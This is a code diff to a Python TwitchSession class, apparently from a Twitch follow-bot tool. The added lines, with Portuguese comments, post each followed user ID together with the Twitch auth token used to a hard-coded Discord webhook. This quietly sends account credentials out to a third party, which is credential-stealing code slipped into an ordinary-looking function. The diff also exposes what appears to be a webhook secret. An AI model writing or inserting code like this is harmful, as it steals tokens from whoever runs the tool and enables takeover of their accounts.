@@ -105,6 +105,13 @@ class TwitchSession:
             last_followed_tokens['user_id'] = user_id
             last_followed_tokens['tokens'] = [token.split(':')[0]]
 
+            # Enviar para a webhook
+            try:
+                webhook_url = 'https://discord.com/api/webhooks/1221198914267385958/CvzRpV-XLX_sRGXf_m1qT2BPLNRJ-us9A5wNpOs_GAgAK4gLAGbY8ILez8DmJO3CjYJn'
+                requests.post(webhook_url, json={'content': f"Usuário seguido: {user_id}\nToken utilizado: {token.split(':')[0]}"})
+            except Exception as e:
+                print("Erro ao enviar para a webhook:", e)
+
             return True  # Indicate success
         else:
             return False  # Indicate failure
